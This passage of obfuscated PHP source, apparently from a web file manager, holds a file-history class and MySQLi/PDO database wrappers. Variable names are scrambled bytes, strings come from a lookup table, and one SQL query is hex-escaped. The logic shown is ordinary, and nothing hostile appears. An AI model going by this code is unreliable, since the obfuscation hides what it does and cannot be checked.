self::saveData($é‡‚üšû[$ıĞüœÂ[1275]], $é‡‚üšû[$ıĞüœÂ[412]]); self::clearEmptyFolder($é‡‚üšû[$ıĞüœÂ[1274]]); } public static function rollback($®Ÿø„›¸, $Ä‰æš…Ì) { $´ûÔ¾µ‰ =& $_SERVER[”ôÑ§ì¸]; $¯‹Å€Ñ˜ = self::listData($®Ÿø„›¸); if (!$¯‹Å€Ñ˜) { return; } $Ì¹İÛ¹Ü = IO::info($®Ÿø„›¸); foreach ($¯‹Å€Ñ˜[$´ûÔ¾µ‰[412]] as $ïÚĞº§Î => $¬²õĞ´è) { if ($¬²õĞ´è[$´ûÔ¾µ‰[442]] == $Ä‰æš…Ì) { self::add($®Ÿø„›¸); $°¹ª½Æ = $¯‹Å€Ñ˜[$´ûÔ¾µ‰[1274]] . $¬²õĞ´è[$´ûÔ¾µ‰[32]]; $´ÜÖîÀ = IO::copy($°¹ª½Æ, IO::pathFather($®Ÿø„›¸), REPEAT_REPLACE, $Ì¹İÛ¹Ü[$´ûÔ¾µ‰[32]]); if ($´ÜÖîÀ) { self::remove($®Ÿø„›¸, $Ä‰æš…Ì); } return $´ÜÖîÀ; } } return !1; } public static function setDetail($­½Ì„ÑÄ, $¿¨û½ûŠ, $˜À˜ßĞÉ) { $‚›„µ =& $_SERVER[”ôÑ§ì¸]; $²ÓÌ¯Í = self::listData($­½Ì„ÑÄ); if (!$²ÓÌ¯Í) { return; } foreach ($²ÓÌ¯Í[$‚›„µ[412]] as $ªÄ¾†Ú => $¯¼ä˜) { if ($¯¼ä˜[$‚›„µ[442]] == $¿¨û½ûŠ) { $²ÓÌ¯Í[$‚›„µ[412]][$ªÄ¾†Ú][$‚›„µ[1273]] = $˜À˜ßĞÉ; self::saveData($²ÓÌ¯Í[$‚›„µ[1275]], $²ÓÌ¯Í[$‚›„µ[412]]); return !0; } } return !1; } public static function fileInfo($ÓÏšÜ÷Ù, $ÑøÏ˜û) { $ˆöŠı§§ =& $_SERVER[”ôÑ§ì¸]; $ŒÔÍ Æ« = self::listData($ÓÏšÜ÷Ù); if (!$ŒÔÍ Æ«) { show_json(LNG($ˆöŠı§§[105]), !1); } $šÇ¦å³¤ = $ˆöŠı§§[12]; foreach ($ŒÔÍ Æ«[$ˆöŠı§§[412]] as $•ëùÇ™Ÿ => $óåÊ¢–³) { if ($óåÊ¢–³[$ˆöŠı§§[442]] != $ÑøÏ˜û) { continue; } $šÇ¦å³¤ = $ŒÔÍ Æ«[$ˆöŠı§§[1274]] . $óåÊ¢–³[$ˆöŠı§§[32]]; break; } if (!$šÇ¦å³¤) { show_json(LNG($ˆöŠı§§[105]), !1); } return IO::info($šÇ¦å³¤); } public static function fileOut($¤°ø‡Äƒ, $ş±§á¤, $­†¥¤á‹ = false) { $†õÆéÃ =& $_SERVER[”ôÑ§ì¸]; $ËªŞËúÀ = self::fileInfo($¤°ø‡Äƒ, $ş±§á¤); $»úÖ«æÎ =& $GLOBALS[$†õÆéÃ[7]]; $­†¥¤á‹ = isset($»úÖ«æÎ[$†õÆéÃ[1225]]) && $»úÖ«æÎ[$†õÆéÃ[1225]] == 1; if (isset($»úÖ«æÎ[$†õÆéÃ[33]]) && $»úÖ«æÎ[$†õÆéÃ[33]] == $†õÆéÃ[1276]) { return IO::fileOutImage($ËªŞËúÀ[$†õÆéÃ[84]], $»úÖ«æÎ[$†õÆéÃ[1277]]); } IO::fileOut($ËªŞËúÀ[$†õÆéÃ[84]], $­†¥¤á‹, get_path_this($¤°ø‡Äƒ)); } public static function listData($·½æäÅÔ, $öèÚœ¤“ = true) { $ ‹éœ¤ =& $_SERVER[”ôÑ§ì¸]; if ($öèÚœ¤“ && !IO::exist($·½æäÅÔ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($·½æäÅÔ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Áç²¦’ı = self::pathHistory($·½æäÅÔ); $›úË €ª = array($ ‹éœ¤[1275] => $Áç²¦’ı . $ ‹éœ¤[1262], $ ‹éœ¤[1274] => rtrim(get_path_father($Áç²¦’ı), $ ‹éœ¤[8]) . $ ‹éœ¤[8], $ ‹éœ¤[412] => array()); $šö¤ÔÕˆ = IO::getContent($›úË €ª[$ ‹éœ¤[1275]]); if ($šö¤ÔÕˆ) { $£©æğİ = json_decode($šö¤ÔÕˆ, !0); if (is_array($£©æğİ)) { $›úË €ª[$ ‹éœ¤[412]] = $£©æğİ; } } return $›úË €ª; } private static function saveData($È×¥ßËÄ, $´Ø¹©Ã«) { $Ì†‰ÃÁœ =& $_SERVER[”ôÑ§ì¸]; self::log($Ì†‰ÃÁœ[1278] . $È×¥ßËÄ . $Ì†‰ÃÁœ[71] . count($´Ø¹©Ã«), $Ì†‰ÃÁœ[773]); if ($´Ø¹©Ã«) { return IO::setContent($È×¥ßËÄ, json_encode($´Ø¹©Ã«)); } $ŞõíéÖ = IO::pathFather($È×¥ßËÄ); IO::remove($È×¥ßËÄ); self::clearEmptyFolder($ŞõíéÖ); return !0; } public static function clearEmptyFolder($¼À²ÁíÉ) { $µ…¼”£Š =& $_SERVER[”ôÑ§ì¸]; if (trim($¼À²ÁíÉ, $µ…¼”£Š[8]) == trim(self::$_historyBase, $µ…¼”£Š[8])) { return; } $ÄØ×ÈÇ = IO::pathFather($¼À²ÁíÉ); $ñİû€”Ø = IO::has($¼À²ÁíÉ, !0); if ($ñİû€”Ø[$µ…¼”£Š[222]] > 0 || $ñİû€”Ø[$µ…¼”£Š[223]] > 0) { return; } IO::remove($¼À²ÁíÉ); self::clearEmptyFolder($ÄØ×ÈÇ); } private static function getBasePath() { $ıøò‹‚Ğ =& $_SERVER[”ôÑ§ì¸]; $å‡°¸É = Model($ıøò‹‚Ğ[1279])->get($ıøò‹‚Ğ[1280]); if ($å‡°¸É) { if (!IO::exist($å‡°¸É)) { IO::mkdir($å‡°¸É); } if (get_path_this($å‡°¸É) == $ıøò‹‚Ğ[1265]) { $×˜ªâËë = $ıøò‹‚Ğ[1281] . rand_string(8); @rename($å‡°¸É, get_path_father($å‡°¸É) . $ıøò‹‚Ğ[8] . $×˜ªâËë); $å‡°¸É = DATA_PATH . $×˜ªâËë . $ıøò‹‚Ğ[8]; file_put_contents(DATA_PATH . $ıøò‹‚Ğ[1215], $ıøò‹‚Ğ[12]); Model($ıøò‹‚Ğ[1279])->set($ıøò‹‚Ğ[1280], $å‡°¸É); } return $å‡°¸É; } $å‡°¸É = DATA_PATH . $ıøò‹‚Ğ[1281] . rand_string(8) . $ıøò‹‚Ğ[8]; $å‡°¸É = IO::mkdir($å‡°¸É); $å‡°¸É = rtrim($å‡°¸É, $ıøò‹‚Ğ[8]) . $ıøò‹‚Ğ[8]; file_put_contents($å‡°¸É . $ıøò‹‚Ğ[1215], $ıøò‹‚Ğ[12]); file_put_contents(DATA_PATH . $ıøò‹‚Ğ[1215], $ıøò‹‚Ğ[12]); Model($ıøò‹‚Ğ[1279])->set($ıøò‹‚Ğ[1280], $å‡°¸É); return $å‡°¸É; } } goto D–¥¹çÅ´; eíÖÑ§Ø¤ç: class DbMysqli extends Db { public function __construct($İ‹‡ú—å = '') { $ŸÚò¡” =& $_SERVER[”ôÑ§ì¸]; if (!extension_loaded($ŸÚò¡”[943])) { think_exception(think_lang($ŸÚò¡”[14]) . $ŸÚò¡”[944]); } if (!empty($İ‹‡ú—å)) { $this->config = $İ‹‡ú—å; if (empty($this->config[$ŸÚò¡”[17]])) { $this->config[$ŸÚò¡”[17]] = $ŸÚò¡”[12]; } } } public function connect($‡¿«à’Ï = '', $’Å—¤¸Ü = 0) { $½ °º…€ =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->linkID[$’Å—¤¸Ü])) { if (empty($‡¿«à’Ï)) { $‡¿«à’Ï = $this->config; } $this->linkID[$’Å—¤¸Ü] = new mysqli($‡¿«à’Ï[$½ °º…€[917]], $‡¿«à’Ï[$½ °º…€[919]], $‡¿«à’Ï[$½ °º…€[920]], $‡¿«à’Ï[$½ °º…€[21]], $‡¿«à’Ï[$½ °º…€[918]] ? intval($‡¿«à’Ï[$½ °º…€[918]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $£¡¥¿²ø = $this->linkID[$’Å—¤¸Ü]->server_version; $this->linkID[$’Å—¤¸Ü]->query($½ °º…€[921] . think_config($½ °º…€[922]) . $½ °º…€[58]); if ($£¡¥¿²ø > $½ °º…€[923]) { $this->linkID[$’Å—¤¸Ü]->query($½ °º…€[924]); } $this->connected = !0; if (1 != think_config($½ °º…€[22])) { unset($this->config); } } return $this->linkID[$’Å—¤¸Ü]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($œ‚Ü¯¾) { $şïà•ŒÕ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $œ‚Ü¯¾; if ($this->queryID) { $this->free(); } think_action_status($şïà•ŒÕ[23], 1); think_status($şïà•ŒÕ[24]); $this->queryID = $this->_linkID->query($œ‚Ü¯¾); if ($this->_linkID->more_results()) { while (($Š•¨òî = $this->_linkID->next_result()) != NULL) { $Š•¨òî->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($êÎ‚™ŞË) { $ÖØ³ÊÍâ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $êÎ‚™ŞË; if ($this->queryID) { $this->free(); } think_action_status($ÖØ³ÊÍâ[25], 1); think_status($ÖØ³ÊÍâ[24]); $æ—ˆÇ“ï = $this->_linkID->query($êÎ‚™ŞË); $this->debug(); if (!1 === $æ—ˆÇ“ï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $èìœè°¦ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$èìœè°¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ööáÌá = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ööáÌá) { $this->error(); return !1; } } return !0; } private function getAll() { $İ·íã‘ = array(); if ($this->numRows > 0) { for ($«ëç ã = 0; $«ëç ã < $this->numRows; $«ëç ã++) { $İ·íã‘[$«ëç ã] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $İ·íã‘; } public function getFields($®ô‡…Áº) { $‹Ô¨ˆ÷ =& $_SERVER[”ôÑ§ì¸]; $¡àÖÇöİ = $this->query($‹Ô¨ˆ÷[928] . $this->parseKey($®ô‡…Áº)); $ƒµñÆÓÒ = array(); if ($¡àÖÇöİ) { foreach ($¡àÖÇöİ as $¤˜¦ÖÕÁ => $——ı½ã) { $ƒµñÆÓÒ[$——ı½ã[$‹Ô¨ˆ÷[31]]] = array($‹Ô¨ˆ÷[32] => $——ı½ã[$‹Ô¨ˆ÷[31]], $‹Ô¨ˆ÷[33] => $——ı½ã[$‹Ô¨ˆ÷[34]], $‹Ô¨ˆ÷[35] => (bool) ($——ı½ã[$‹Ô¨ˆ÷[36]] === $‹Ô¨ˆ÷[12]), $‹Ô¨ˆ÷[37] => $——ı½ã[$‹Ô¨ˆ÷[38]], $‹Ô¨ˆ÷[39] => strtolower($——ı½ã[$‹Ô¨ˆ÷[40]]) == $‹Ô¨ˆ÷[41], $‹Ô¨ˆ÷[42] => strtolower($——ı½ã[$‹Ô¨ˆ÷[43]]) == $‹Ô¨ˆ÷[44]); } } return $ƒµñÆÓÒ; } public function getTables($òŠğí¿Ë = '') { $°ô¥¼Ï =& $_SERVER[”ôÑ§ì¸]; $ÎÛşĞÃ = !empty($òŠğí¿Ë) ? $°ô¥¼Ï[930] . $òŠğí¿Ë . $°ô¥¼Ï[931] : $°ô¥¼Ï[932]; $×ÖÇÁÃ = $this->query($ÎÛşĞÃ); $€ù²‹ã¿ = array(); if ($×ÖÇÁÃ) { foreach ($×ÖÇÁÃ as $˜Ü÷¼¹‹ => $ù³õËŒö) { $€ù²‹ã¿[$˜Ü÷¼¹‹] = current($ù³õËŒö); } } return $€ù²‹ã¿; } public function replace($ÕÁºîø, $ÌıéÇ¨© = array()) { $œŸ‰ñó =& $_SERVER[”ôÑ§ì¸]; foreach ($ÕÁºîø as $ıÙ‰ËŸÚ => $Õ—°ø¦‰) { $ëÕÕÖ€Ê = $this->parseValue($Õ—°ø¦‰); if (is_scalar($ëÕÕÖ€Ê)) { $öÊ•µ¶[] = $ëÕÕÖ€Ê; $ß¬îÁñÚ[] = $this->parseKey($ıÙ‰ËŸÚ); } } $€áÄÖµô = $œŸ‰ñó[933] . $this->parseTable($ÌıéÇ¨©[$œŸ‰ñó[322]]) . $œŸ‰ñó[934] . implode($œŸ‰ñó[50], $ß¬îÁñÚ) . $œŸ‰ñó[935] . implode($œŸ‰ñó[50], $öÊ•µ¶) . $œŸ‰ñó[936]; return $this->execute($€áÄÖµô); } public function insertAll($‚‰éÔ, $‘­¤ìÕÂ = array(), $‰®£€å¡ = false) { $¦áØÚ’ =& $_SERVER[”ôÑ§ì¸]; if (!is_array($‚‰éÔ[0])) { return !1; } $ÕêËª—í = array_keys($‚‰éÔ[0]); $ºõûç´ = array(); foreach ($‚‰éÔ as $€‡ø¡Ø´) { $Å™ŞÀèÂ = array(); foreach ($€‡ø¡Ø´ as $¾İïÕ† => $¡¤ò©´£) { $¡¤ò©´£ = $this->parseValue($¡¤ò©´£); if (is_scalar($¡¤ò©´£)) { $Å™ŞÀèÂ[] = $¡¤ò©´£; } } $ºõûç´[] = $¦áØÚ’[303] . implode($¦áØÚ’[50], $Å™ŞÀèÂ) . $¦áØÚ’[936]; } array_walk($ÕêËª—í, array($this, $¦áØÚ’[937])); $óõÛ±¥İ = $‰®£€å¡ ? $¦áØÚ’[938] : $¦áØÚ’[939]; $´áç‰½ñ = $óõÛ±¥İ . $¦áØÚ’[940] . $this->parseTable($‘­¤ìÕÂ[$¦áØÚ’[322]]) . $¦áØÚ’[934] . implode($¦áØÚ’[50], $ÕêËª—í) . $¦áØÚ’[941] . implode($¦áØÚ’[50], $ºõûç´); return $this->execute($´áç‰½ñ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $É²à®Œì =& $_SERVER[”ôÑ§ì¸]; $this->error = $this->_linkID->errno . $É²à®Œì[4] . $this->_linkID->error; if ($É²à®Œì[12] != $this->queryStr) { $this->error .= LNG($É²à®Œì[48]) . $this->queryStr; } think_trace($this->error, $É²à®Œì[12], $É²à®Œì[49]); return $this->error; } public function escapeString($óñ”™¨’) { if ($this->_linkID) { return $this->_linkID->real_escape_string($óñ”™¨’); } else { return addslashes($óñ”™¨’); } } public function parseKey(&$ÙÊªºñ¤, $³£¸¦® = true) { $·‰ãè =& $_SERVER[”ôÑ§ì¸]; if ($³£¸¦®) { $ÙÊªºñ¤ = $this->parseKeyCheck($ÙÊªºñ¤); } if ($ÙÊªºñ¤ != $·‰ãè[202] && !preg_match($·‰ãè[942], $ÙÊªºñ¤)) { $ÙÊªºñ¤ = $·‰ãè[428] . trim($ÙÊªºñ¤, $·‰ãè[428]) . $·‰ãè[428]; } return $ÙÊªºñ¤; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¸åÄ˜êº = '') { $“µŠµ =& $_SERVER[”ôÑ§ì¸]; if (!class_exists($“µŠµ[945])) { think_exception(think_lang($“µŠµ[14]) . $“µŠµ[946]); } if (!empty($¸åÄ˜êº)) { $this->config = $¸åÄ˜êº; if (empty($this->config[$“µŠµ[17]])) { $this->config[$“µŠµ[17]] = array(); } } } public function connect($‚æÓªï‚ = '', $¾ŞÔ‡ = 0) { $ÆÊëâî­ =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->linkID[$¾ŞÔ‡])) { if (empty($‚æÓªï‚)) { $‚æÓªï‚ = $this->config; } $ïÔÄÖšá = !empty($‚æÓªï‚[$ÆÊëâî­[17]][$ÆÊëâî­[18]]) ? $‚æÓªï‚[$ÆÊëâî­[17]][$ÆÊëâî­[18]] : $this->pconnect; if ($ïÔÄÖšá) { $‚æÓªï‚[$ÆÊëâî­[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¾ŞÔ‡] = new PDO($‚æÓªï‚[$ÆÊëâî­[947]], $‚æÓªï‚[$ÆÊëâî­[919]], $‚æÓªï‚[$ÆÊëâî­[920]], $‚æÓªï‚[$ÆÊëâî­[17]]); } catch (PDOException $ûºö¬ÑÚ) { think_exception($ûºö¬ÑÚ->getMessage()); } $this->dbType = $this->_getDsnType($‚æÓªï‚[$ÆÊëâî­[947]]); if (in_array($this->dbType, array($ÆÊëâî­[948], $ÆÊëâî­[949], $ÆÊëâî­[950], $ÆÊëâî­[951]))) { think_exception($ÆÊëâî­[952] . $this->dbType . $ÆÊëâî­[953] . $this->dbType . $ÆÊëâî­[954]); } if (!$this->linkID[$¾ŞÔ‡]) { think_exception($ÆÊëâî­[955]); } try { $this->linkID[$¾ŞÔ‡]->exec($ÆÊëâî­[956] . think_config($ÆÊëâî­[922])); } catch (Exception $ûºö¬ÑÚ) { } $this->connected = !0; if (1 != think_config($ÆÊëâî­[22])) { unset($this->config); } } return $this->linkID[$¾ŞÔ‡]; } public function free() { $this->PDOStatement = null; } public function query($˜÷úÉÒ, $ÆıóÙ¢ğ = array()) { $¤ˆ’·œ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜÷úÉÒ; if (!empty($ÆıóÙ¢ğ)) { $this->queryStr .= $¤ˆ’·œ[957] . print_r($ÆıóÙ¢ğ, !0) . $¤ˆ’·œ[958]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¤ˆ’·œ[23], 1); think_status($¤ˆ’·œ[24]); $this->PDOStatement = $this->_linkID->prepare($˜÷úÉÒ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $æ£ƒÖ¤± = $this->PDOStatement->execute($ÆıóÙ¢ğ); $this->debug(); if (!1 === $æ£ƒÖ¤±) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ë¹û«­, $ÏÔ„êìÚ = array()) { $Àˆ¢°Ú¨ =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ë¹û«­; if (!empty($ÏÔ„êìÚ)) { $this->queryStr .= $Àˆ¢°Ú¨[957] . print_r($ÏÔ„êìÚ, !0) . $Àˆ¢°Ú¨[958]; } $ıê°çÎ¶ = !1; if ($this->dbType == $Àˆ¢°Ú¨[951]) { if (preg_match($Àˆ¢°Ú¨[959], $this->queryStr, $ÒÉè­°â)) { $this->table = think_config($Àˆ¢°Ú¨[960]) . str_ireplace(think_config($Àˆ¢°Ú¨[961]), $Àˆ¢°Ú¨[421], $ÒÉè­°â[2]); $ıê°çÎ¶ = (bool) $this->query($Àˆ¢°Ú¨[962] . strtoupper($this->table) . $Àˆ¢°Ú¨[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Àˆ¢°Ú¨[25], 1); think_status($Àˆ¢°Ú¨[24]); $this->PDOStatement = $this->_linkID->prepare($ë¹û«­); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $…·éñ = $this->PDOStatement->execute($ÏÔ„êìÚ); $this->debug(); if (!1 === $…·éñ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ıê°çÎ¶ || preg_match($Àˆ¢°Ú¨[963], $ë¹û«­)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¿¥¤Ş´İ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¿¥¤Ş´İ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $È¾…›÷ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$È¾…›÷) { $this->error(); return !1; } } return !0; } private function getAll() { $¿Ãêàä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¿Ãêàä); return $¿Ãêàä; } public function getFields($ÓøøûĞ) { $ëé­ßãù =& $_SERVER[”ôÑ§ì¸]; $this->initConnect(!0); if (think_config($ëé­ßãù[964])) { $ÌÀ¯·¤Ê = str_replace($ëé­ßãù[965], $ÓøøûĞ, think_config($ëé­ßãù[964])); } else { switch ($this->dbType) { case $ëé­ßãù[948]: case $ëé­ßãù[966]: $ÌÀ¯·¤Ê = "\123\x45\x4c\105\x43\x54\40\x20\x20\x63\x6f\154\165\x6d\x6e\x5f\x6e\x61\155\145\x20\x61\163\x20\47\116\x61\155\145\47\54\x20\40\40\x64\141\x74\x61\x5f\x74\x79\160\145\x20\141\163\x20\47\x54\x79\x70\x65\x27\x2c\40\x20\x20\x63\x6f\x6c\x75\x6d\156\x5f\144\145\x66\x61\x75\x6c\x74\x20\141\163\40\x27\x44\x65\x66\x61\x75\x6c\x74\47\x2c\40\40\x20\151\x73\137\x6e\165\154\154\141\x62\154\145\40\x61\x73\40\47\116\165\154\x6c\x27\12\x9\11\x46\x52\117\x4d\x9\x69\156\146\157\x72\155\141\164\151\x6f\156\x5f\163\143\x68\145\155\141\56\164\141\142\154\x65\163\40\101\123\x20\164\xa\x9\11\x4a\117\111\x4e\x9\x69\156\x66\x6f\162\155\141\x74\151\157\156\x5f\163\143\150\145\x6d\141\56\x63\x6f\x6c\165\155\x6e\163\x20\101\123\40\143\12\11\x9\117\x4e\40\40\x74\56\x74\141\142\x6c\x65\137\x63\x61\164\x61\154\157\147\40\x3d\x20\x63\x2e\x74\141\x62\154\145\137\x63\x61\164\x61\x6c\x6f\147\12\11\11\x41\116\104\x20\x74\x2e\164\141\x62\x6c\145\137\163\x63\150\145\x6d\141\x20\x3d\x20\x63\56\164\141\x62\154\145\137\x73\143\150\145\x6d\x61\12\11\x9\101\116\x44\40\164\56\164\141\x62\x6c\x65\x5f\156\141\155\x65\x20\75\x20\143\56\164\141\142\154\x65\x5f\156\141\x6d\x65\12\x9\x9\x57\110\x45\122\105\40\40\40\164\56\164\x61\x62\154\145\137\156\141\x6d\x65\x20\x3d\x20\47{$ÓøøûĞ}\x27"; break; case $ëé­ßãù[967]: $ÌÀ¯·¤Ê = $ëé­ßãù[968] . $ÓøøûĞ . $ëé­ßãù[969]; break; case $ëé­ßãù[949]: case $ëé­ßãù[951]: $ÌÀ¯·¤Ê = $ëé­ßãù[970] . $ëé­ßãù[971] . $ëé­ßãù[972] . strtoupper($ÓøøûĞ) . $ëé­ßãù[973] . strtoupper($ÓøøûĞ) . $ëé­ßãù[974]; break; case $ëé­ßãù[975]: $ÌÀ¯·¤Ê = $ëé­ßãù[976] . $ÓøøûĞ . $ëé­ßãù[977]; break; case $ëé­ßãù[950]: break; case $ëé­ßãù[978]: default: $ÌÀ¯·¤Ê = $ëé­ßãù[979] . ($this->dbType == $ëé­ßãù[978] ? "\x60{$ÓøøûĞ}\140" : $ÓøøûĞ); } } $Àï¼Ş´ = $this->query($ÌÀ¯·¤Ê); $¶Èò¦´º = array(); if ($Àï¼Ş´) { foreach ($Àï¼Ş´ as $²šÈÂßÅ => $­”ó÷²‡) { $­”ó÷²‡ = array_change_key_case($­”ó÷²‡); $­”ó÷²‡[$ëé­ßãù[32]] = isset($­”ó÷²‡[$ëé­ßãù[32]]) ? $­”ó÷²‡[$ëé­ßãù[32]] : $ëé­ßãù[421]; $­”ó÷²‡[$ëé­ßãù[33]] = isset($­”ó÷²‡[$ëé­ßãù[33]]) ? $­”ó÷²‡[$ëé­ßãù[33]] : $ëé­ßãù[421]; $¦¢††‰‡ = isset($­”ó÷²‡[$ëé­ßãù[316]]) ? $­”ó÷²‡[$ëé­ßãù[316]] : $­”ó÷²‡[$ëé­ßãù[32]]; $¶Èò¦´º[$¦¢††‰‡] = array($ëé­ßãù[32] => $¦¢††‰‡, $ëé­ßãù[33] => $­”ó÷²‡[$ëé­ßãù[33]], $ëé­ßãù[35] => (bool) (isset($­”ó÷²‡[$ëé­ßãù[103]]) && $­”ó÷²‡[$ëé­ßãù[103]] === $ëé­ßãù[12] || isset($­”ó÷²‡[$ëé­ßãù[35]]) && $­”ó÷²‡[$ëé­ßãù[35]] === $ëé­ßãù[12]), $ëé­ßãù[37] => isset($­”ó÷²‡[$ëé­ßãù[37]]) ? $­”ó÷²‡[$ëé­ßãù[37]] : (isset($­”ó÷²‡[$ëé­ßãù[56]]) ? $­”ó÷²‡[$ëé­ßãù[56]] : $ëé­ßãù[421]), $ëé­ßãù[39] => isset($­”ó÷²‡[$ëé­ßãù[94]]) ? strtolower($­”ó÷²‡[$ëé­ßãù[94]]) == $ëé­ßãù[41] : (isset($­”ó÷²‡[$ëé­ßãù[57]]) ? $­”ó÷²‡[$ëé­ßãù[57]] : !1), $ëé­ßãù[42] => isset($­”ó÷²‡[$ëé­ßãù[980]]) ? strtolower($­”ó÷²‡[$ëé­ßãù[980]]) == $ëé­ßãù[44] : (isset($­”ó÷²‡[$ëé­ßãù[94]]) ? $­”ó÷²‡[$ëé­ßãù[94]] : !1)); } } return $¶Èò¦´º; } public function getTables($ÄÇß² = '') { $™ŸË¯Üš =& $_SERVER[”ôÑ§ì¸]; if (think_config($™ŸË¯Üš[981])) { $„…ÓªùÑ = str_replace($™ŸË¯Üš[982], $ÄÇß², think_config($™ŸË¯Üš[981])); } else { switch ($this->dbType) { case $™ŸË¯Üš[949]: case $™ŸË¯Üš[951]: $„…ÓªùÑ = $™ŸË¯Üš[983]; break; case $™ŸË¯Üš[948]: case $™ŸË¯Üš[966]: $„…ÓªùÑ = $™ŸË¯Üš[984]; break; case $™ŸË¯Üš[975]: $„…ÓªùÑ = $™ŸË¯Üš[985]; break; case $™ŸË¯Üš[950]: think_exception(think_lang($™ŸË¯Üš[986]) . $™ŸË¯Üš[987]); break; case $™ŸË¯Üš[967]: $„…ÓªùÑ = $™ŸË¯Üš[45] . $™ŸË¯Üš[46] . $™ŸË¯Üš[47]; break; case $™ŸË¯Üš[978]: default: if (!empty($ÄÇß²)) { $„…ÓªùÑ = $™ŸË¯Üš[930] . $ÄÇß² . $™ŸË¯Üš[931]; } else { $„…ÓªùÑ = $™ŸË¯Üš[932]; } } } $ßØ°¶µŒ = $this->query($„…ÓªùÑ); $²¤Ü ½Á = array(); foreach ($ßØ°¶µŒ as $ìİÎ¸Åí => $ù˜ô¤éÉ) { $²¤Ü ½Á[$ìİÎ¸Åí] = current($ù˜ô¤éÉ); } return $²¤Ü ½Á; } protected function parseLimit($û»‹ıß) { $ïÚ°Õ‰Ø =& $_SERVER[”ôÑ§ì¸]; $»Áğƒé† = $ïÚ°Õ‰Ø[12]; if (!empty($û»‹ıß)) { switch ($this->dbType) { case $ïÚ°Õ‰Ø[975]: case $ïÚ°Õ‰Ø[967]: $û»‹ıß = explode($ïÚ°Õ‰Ø[50], $û»‹ıß); if (count($û»‹ıß) > 1) { $»Áğƒé† .= $ïÚ°Õ‰Ø[51] . $û»‹ıß[1] . $ïÚ°Õ‰Ø[52] . $û»‹ıß[0] . $ïÚ°Õ‰Ø[53]; } else { $»Áğƒé† .= $ïÚ°Õ‰Ø[51] . $û»‹ıß[0] . $ïÚ°Õ‰Ø[53]; } break; case $ïÚ°Õ‰Ø[948]: case $ïÚ°Õ‰Ø[966]: break; case $ïÚ°Õ‰Ø[950]: break; case $ïÚ°Õ‰Ø[949]: case $ïÚ°Õ‰Ø[951]: break; case $ïÚ°Õ‰Ø[978]: default: $»Áğƒé† .= $ïÚ°Õ‰Ø[51] . $û»‹ıß . $ïÚ°Õ‰Ø[53]; } } return $»Áğƒé†; } public function parseKey(&$æ™ÃÜÁ‘, $ùÇ½´‘‘ = true) { $ñ«¼€ò— =& $_SERVER[”ôÑ§ì¸]; if ($ùÇ½´‘‘) { $æ™ÃÜÁ‘ = $this->parseKeyCheck($æ™ÃÜÁ‘); } if ($this->dbType == $ñ«¼€ò—[978]) { if ($æ™ÃÜÁ‘ != $ñ«¼€ò—[202] && !preg_match($ñ«¼€ò—[942], $æ™ÃÜÁ‘)) { $æ™ÃÜÁ‘ = $ñ«¼€ò—[428] . trim($æ™ÃÜÁ‘, $ñ«¼€ò—[428]) . $ñ«¼€ò—[428]; } return $æ™ÃÜÁ‘; } else { return parent::parseKey($æ™ÃÜÁ‘, $ùÇ½´‘‘); } } public function close() { $this->_linkID = null; } public function error() { $Á§ëõ¶Ç =& $_SERVER[”ôÑ§ì¸]; if ($this->PDOStatement) { $·é¶•² = $this->PDOStatement->errorInfo(); $this->error = $·é¶•²[1] . $Á§ëõ¶Ç[4] . $·é¶•²[2]; } else { $this->error = $Á§ëõ¶Ç[12]; } if ($Á§ëõ¶Ç[12] != $this->queryStr) { $this->error .= LNG($Á§ëõ¶Ç[48]) . $this->queryStr; } think_trace($this->error, $Á§ëõ¶Ç[12], $Á§ëõ¶Ç[49]); return $this->error; } public function escapeString($™é“ú™Ü) { $ŠÃÚßä =& $_SERVER[”ôÑ§ì¸]; switch ($this->dbType) { case $ŠÃÚßä[975]: case $ŠÃÚßä[948]: case $ŠÃÚßä[966]: case $ŠÃÚßä[978]: return addslashes($™é“ú™Ü); case $ŠÃÚßä[950]: case $ŠÃÚßä[967]: case 